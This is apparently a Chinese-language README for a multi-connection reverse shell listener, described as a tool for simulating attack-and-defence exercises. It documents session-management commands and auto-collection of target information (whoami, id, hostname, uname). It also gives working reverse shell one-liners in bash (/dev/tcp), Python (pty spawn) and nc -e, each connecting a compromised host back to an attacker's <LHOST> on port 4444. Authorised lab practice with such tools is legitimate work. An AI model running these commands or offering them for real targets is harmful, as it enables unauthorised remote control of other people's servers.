# nc-test · 多连接反弹 Shell 监听器

用于模拟 Web 攻防场景中批量反弹 shell 的接收端。监听 4444 端口，支持多个目标并发反向连接，连接后自动采集目标系统基础信息，并提供交互式 shell 管理界面。

---

## 文件

| 文件 | 说明 |
|------|------|
| `multi_handler.py` | 主程序，多线程反弹 shell 监听器 |

---

## 快速开始

```bash
python3 multi_handler.py
```

默认监听 `0.0.0.0:4444`，启动后进入交互命令行。

---

## 内置命令

| 命令 | 简写 | 说明 |
|------|------|------|
| `sessions` | `s` / `list` | 列出所有活跃连接及基础信息 |
| `interact <id>` | — | 进入指定会话的交互 shell |
| `kill <id>` | — | 强制断开指定连接 |
| `quit` | `q` / `exit` | 退出程序 |

在 `interact` 模式中输入 `exit` 返回主命令行，连接保持不断。

---

## 连接建立（目标端执行）

### bash

```bash
bash -i >& /dev/tcp/<LHOST>/4444 0>&1
```

### Python 3

```bash
python3 -c "import socket,os,pty;s=socket.socket();s.connect(('<LHOST>',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')"
```

### nc（支持 -e 参数的版本）

```bash
nc <LHOST> 4444 -e /bin/bash
```

---

## 新连接输出示例

```
[+] 新连接 #1  [2026-03-10 16:30:00]
    IP/Port  : 192.168.1.100:43210
    用户     : www-data
    ID信息   : uid=33(www-data) gid=33(www-data) groups=33(www-data)
    主机名   : victim-server
    系统     : Linux victim-server 5.15.0-91-generic #101-Ubuntu SMP x86_64 GNU/Linux
    当前目录 : /var/www/html
    输入 'interact 1' 进入该会话
```

---

## 实现说明

- 每个连接独立后台线程，最多支持 50 个并发连接
- 连接建立后自动执行 `whoami && id && hostname && uname -a && pwd` 采集信息
- `interacting` 标志位防止后台线程与交互模式竞争同一 socket
- 自动剥离 ANSI 转义码和 `\r`，兼容 `bash -i` 的命令回显输出
